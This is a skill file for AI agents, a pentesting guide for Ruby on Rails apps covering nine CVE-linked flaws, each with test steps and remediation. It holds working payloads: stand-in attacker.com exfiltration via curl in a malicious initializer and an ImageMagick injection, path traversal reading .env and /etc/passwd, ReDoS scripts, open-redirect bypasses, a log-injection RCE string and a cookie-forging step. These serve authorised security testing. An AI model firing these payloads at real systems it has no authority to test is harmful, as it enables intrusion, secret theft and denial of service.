---
name: ruby-rails-pentest
description: Ruby on Rails and Ruby application security testing. Use this skill whenever you're pentesting Ruby applications, Rails apps, or need to check for Ruby-specific vulnerabilities like file upload RCE, Active Storage exploits, Rack middleware issues, ReDoS attacks, cookie forgery, or log injection. Trigger this for any Ruby/Rails security assessment, vulnerability research, or when analyzing Gemfile.lock for vulnerable versions.
---

# Ruby/Rails Pentesting Skill

A comprehensive guide for security testing Ruby on Rails applications and Ruby-based web services.

## Quick Reference: Common Vulnerabilities

| Vulnerability | CVE | Affected Versions | Impact |
|--------------|-----|-------------------|--------|
| Active Storage Image Transform | CVE-2025-24293 | Rails < 7.1.5.2 / 7.2.2.2 / 8.0.2.1 | RCE |
| Rack::Static LFI | CVE-2025-27610 | Rack < 2.2.13 / 3.0.14 / 3.1.12 | LFI |
| Rack Multipart ReDoS | CVE-2024-25126 | Rack < 3.0.9.1 / 2.2.8.1 | DoS |
| REXML ReDoS | CVE-2024-49761 | REXML < 3.3.9 | DoS |
| CGI Cookie ReDoS | CVE-2025-27219/27220 | CGI < 0.3.5.1 / 0.3.7 / 0.4.2 | DoS |
| googlesign_in Redirect | CVE-2025-57821 | googlesign_in < 1.3.0 | Open Redirect |

---

## 1. File Upload to RCE

### When to test
- Application allows file uploads
- Upload destination is writable and under `config/`
- Rails app with initializers or autoload paths

### What to look for
- Upload endpoints that accept `.rb` files
- Upload paths under `config/initializers/`, `config/`, or other autoload locations
- Dev/staging builds that copy user files into container images

### Testing approach
1. Attempt to upload a `.rb` file with malicious code
2. Target `config/initializers/` directory (classic Rails autoload path)
3. Check if uploaded files are executed on app restart

### Example payload
```ruby
# config/initializers/malicious.rb
system("curl http://attacker.com/shell?data=#{`id`}")
```

### Remediation
- Restrict upload file types to non-executable formats
- Store uploads outside Rails load paths
- Use separate storage (S3, etc.) for user files

---

## 2. Active Storage Image Transformation (CVE-2025-24293)

### When to test
- Rails app with Active Storage enabled
- Image processing/variant endpoints exist
- User can influence image transformation parameters

### Vulnerable pattern
```erb
<%= image_tag blob.variant(params[:t] => params[:v]) %>
```

### Testing approach
1. Find endpoints accepting variant/processing options
2. Fuzz `params[:t]` (transformation type) and `params[:v]` (values)
3. Try suspicious ImageMagick operations
4. Look for command injection indicators

### Test payloads
```bash
# Try dangerous transformation methods
curl -X POST http://target/variant \
  -d 't=strip&v=malicious_option'

# Attempt blind exfiltration via ImageMagick
curl -X POST http://target/variant \
  -d 't=convert&v=png:pipe:/bin/bash -c "curl http://attacker.com/$(id)"'
```

### Detection
- Rails < 7.1.5.2 / 7.2.2.2 / 8.0.2.1 with Active Storage + image_processing + mini_magick
- User-controlled transformation parameters

### Remediation
- Upgrade Rails to patched versions
- Enforce strict allowlists for transformation methods
- Harden ImageMagick policy.xml

---

## 3. Rack::Static LFI (CVE-2025-27610)

### When to test
- App uses Rack middleware directly or via frameworks
- Static file serving is configured
- `config.ru` or middleware stack visible

### Testing approach
1. Identify static file paths (assets, favicon, etc.)
2. Try encoded path traversal sequences
3. Adjust prefix to match configured `urls:`

### Test payloads
```bash
# Basic traversal
curl http://target/assets/%2e%2e/%2e%2e/config/database.yml

# Alternative encoding
curl http://target/favicon.ico/..%2f..%2f.env

# Double encoding
curl http://target/assets/%252e%252e/%252e%252e/etc/passwd
```

### Detection
- Rack < 2.2.13 / 3.0.14 / 3.1.12
- `Rack::Static` middleware with unset/misconfigured `:root`
- Response contains file contents from traversal

### Remediation
- Upgrade Rack to patched version
- Explicitly set `:root` to public files directory only
- Use `Rack::Protection` middleware

---

## 4. Rack Multipart Parser ReDoS (CVE-2024-25126)

### When to test
- Any Rack-based stack (Rails/Sinatra/Hanami/Grape)
- POST endpoints accepting multipart/form-data
- Fronted by nginx/haproxy with keep-alive

### Testing approach
1. Send crafted multipart header with many parameters
2. Monitor worker response time
3. Repeat in parallel to exhaust workers

### PoC script
```bash
python3 - <<'PY'
import requests
import time

url = "http://target/"
headers = {
    'Content-Type': 'multipart/form-data; ' + 'A='*5000
}

start = time.time()
try:
    r = requests.post(url, data='x', headers=headers, timeout=30)
    print(f"Response in {time.time()-start:.2f}s")
except requests.exceptions.Timeout:
    print(f"Timeout after {time.time()-start:.2f}s - likely vulnerable")
PY
```

### Detection
- Rack < 3.0.9.1 / 2.2.8.1
- Worker hangs or responds slowly to multipart requests
- CPU spikes on request parsing

### Remediation
- Upgrade Rack to patched version
- Implement request size limits at proxy level
- Use connection timeouts

---

## 5. REXML XML Parser ReDoS (CVE-2024-49761)

### When to test
- App processes XML (SOAP, SAML, SVG uploads, XML APIs)
- Ruby 3.1 and earlier
- REXML gem in use

### Testing approach
1. Find XML processing endpoints
2. Send crafted XML with long hex numeric character references
3. Monitor CPU and response time

### Test payload
```bash
curl -X POST http://target/xml \
  -H 'Content-Type: application/xml' \
  --data '<?xml version="1.0"?><r>&#11111111111111111111111111x41;</r>'
```

### Detection
- REXML < 3.3.9
- Process stays busy for seconds
- Worker CPU spikes on XML parsing

### Remediation
- Upgrade REXML to 3.3.9+
- Use alternative XML parsers (Nokogiri with safe options)
- Implement XML size limits

---

## 6. CGI Cookie Parsing ReDoS (CVE-2025-27219 & CVE-2025-27220)

### When to test
- Rack-based apps using `cgi` gem
- Cookie handling or HTML escaping

### Testing approach
1. Send massive Cookie header with thousands of delimiters
2. Feed untrusted HTML to helper code
3. Monitor for worker lockup

### Test payload
```bash
# Generate large cookie header
python3 -c "print('Cookie: ' + ';'.join(['x=y']*5000))" | \
curl -X POST http://target/ -H @-
```

### Detection
- CGI < 0.3.5.1 / 0.3.7 / 0.4.2
- Worker freezes on cookie parsing
- O(N²) behavior with large inputs

### Remediation
- Upgrade CGI gem to patched version
- Implement cookie size limits
- Use alternative parsing libraries

---

## 7. Basecamp googlesign_in Open Redirect (CVE-2025-57821)

### When to test
- Rails app with Google OAuth
- `googlesign_in` gem in Gemfile.lock

### Testing approach
1. Check Gemfile.lock for `googlesign_in` < 1.3.0
2. Try malformed `proceedto` parameter values
3. Check Location header and cookie reflection

### Test payloads
```bash
# Malformed URL bypass
curl -v "http://target/auth/google_oauth2/callback?proceedto=//attacker.com/%2F.."

# Alternative bypass attempts
curl -v "http://target/auth/google_oauth2/callback?proceedto=//attacker.com/"
curl -v "http://target/auth/google_oauth2/callback?proceedto=\\/\\/attacker.com/"
```

### Detection
- `googlesign_in` < 1.3.0 in Gemfile.lock
- Location header redirects to attacker domain
- Flash/session cookies preserved across redirect

### Remediation
- Upgrade googlesign_in to 1.3.0+
- Implement strict same-origin validation
- Use secure cookie attributes

---

## 8. Rails Cookie Forging (When secret_key_base is Leaked)

### When to test
- `secret_key_base` found in repo, logs, or misconfigured credentials
- Rails app with encrypted/signed cookies
- Authorization data stored in cookies

### Testing approach
1. Extract leaked `secret_key_base`
2. Decrypt existing cookies
3. Modify sensitive fields (role, user_id, permissions)
4. Re-encrypt and test

### Use the bundled script
Run `scripts/forge_rails_cookie.rb` to decrypt and forge cookies:
```bash
ruby scripts/forge_rails_cookie.rb "<encrypted_cookie>" "<secret_key_base>"
```

### Detection
- `secret_key_base` exposed in source control, logs, or configs
- Cookies contain sensitive authorization data
- App trusts cookies for authorization decisions

### Remediation
- Rotate `secret_key_base` immediately
- Use server-side sessions instead of cookies
- Implement proper authorization checks

---

## 9. Log Injection → RCE via Pathname.cleanpath

### When to test
- App logs user input verbatim
- App uses `load` with paths derived from user input
- `Pathname#cleanpath` used on user-controlled paths

### Vulnerable pattern
```ruby
logger.info("Running script #{param}")
load "scripts/#{Pathname.new(param).cleanpath}"
```

### Exploitation approach
1. Send payload that logs valid Ruby code
2. Payload must also resolve to log file path via `cleanpath`
3. App loads and executes the poisoned log

### Test payload
```bash
# URL-encoded payload
%0A%5D%5B0%5D%3D1%3Bsystem("id")%23%3A%2F%2F..%2F..%2F..%2F..%2Flogs%2Ferror.log

# Decoded:
# \n][0]=1;system("id")#://../../../../logs/error.log
```

### How it works
- Leading newline breaks out of log INFO line
- `]` closes dangling bracket from log format
- `][0]=1` satisfies Ruby parser
- `#://` starts comment for Ruby but `cleanpath` ignores it
- Traversal resolves to log file path

### Exfiltration payload
```bash
%0A%5D%5B0%5D%3D1%3Bf%3DDir%5B%27%2Ftmp%2Fflag%2A.txt%27%5D%5B0%5D%3Bc%3DFile.read(f)%3Bputs%20c%23%3A%2F%2F..%2F..%2F..%2F..%2Flogs%2Ferror.log
```

### Detection
- User input logged verbatim
- `load` called with user-derived paths
- `Pathname#cleanpath` on user input

### Remediation
- Sanitize user input before logging
- Never use `load` with user-controlled paths
- Use `require` with explicit paths instead

---

## Gemfile.lock Analysis

### Quick vulnerability check
```bash
# Check for vulnerable versions
grep -E "rack\s+|rexml\s+|cgi\s+|googlesign_in\s+" Gemfile.lock

# Common vulnerable patterns
# rack < 3.0.9.1 or < 2.2.8.1
# rexml < 3.3.9
# cgi < 0.3.5.1
# googlesign_in < 1.3.0
```

### Priority order for testing
1. **RCE vulnerabilities** (Active Storage, file upload, log injection)
2. **LFI vulnerabilities** (Rack::Static)
3. **DoS vulnerabilities** (ReDoS in Rack, REXML, CGI)
4. **Authentication bypass** (cookie forgery, open redirects)

---

## References

- [Rails Security Announcements](https://discuss.rubyonrails.org/c/announcements)
- [Ruby Security Advisories](https://www.ruby-lang.org/en/news/)
- [GitHub Security Advisories](https://github.com/advisories)
- [NVD CVE Database](https://nvd.nist.gov/)
